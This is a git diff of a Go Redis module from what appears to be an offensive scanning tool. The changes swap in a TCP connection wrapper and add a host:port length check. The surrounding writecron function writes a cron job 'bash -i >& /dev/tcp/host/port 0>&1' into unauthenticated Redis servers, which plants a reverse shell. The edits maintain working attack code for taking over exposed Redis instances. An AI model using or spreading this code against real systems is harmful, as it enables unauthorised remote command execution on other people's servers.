@@ -47,7 +47,7 @@ func RedisScan(info *common.HostInfo) (tmperr error) {
 func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 	flag = false
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
-	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
+	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	defer func() {
 		if conn != nil {
 			conn.Close()
@@ -87,7 +87,7 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 	flag = false
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
-	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
+	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	defer func() {
 		if conn != nil {
 			conn.Close()
@@ -246,7 +246,11 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 			return flag, text, err
 		}
 		if strings.Contains(text, "OK") {
-			scanIp, scanPort := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
+			target := strings.Split(host, ":")
+			if len(target) < 2 {
+				return flag, "host error", err
+			}
+			scanIp, scanPort := target[0], target[1]
 			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
 			if err != nil {
 				return flag, text, err
